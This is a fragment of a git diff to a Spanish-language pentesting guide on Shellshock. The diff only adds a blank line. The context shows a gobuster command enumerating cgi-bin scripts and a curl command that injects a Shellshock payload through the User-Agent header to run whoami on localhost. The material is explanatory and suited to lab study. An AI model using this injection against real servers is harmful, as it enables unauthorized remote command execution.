@@ -13,6 +13,7 @@ Una vez encontrado el directorio cgi-bin, lo ideal es enumerar archivos con exte
 ```bash
 gobuster dir -u http://localhost/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi -v
 ```
+ 
  Luego de haber encontrado un archivo dentro de ese directorio podemos proceder a intentar ejecutar comando con el uso de curl mediante el User-Agent
  ```bash
 curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /usr/bin/whoami"
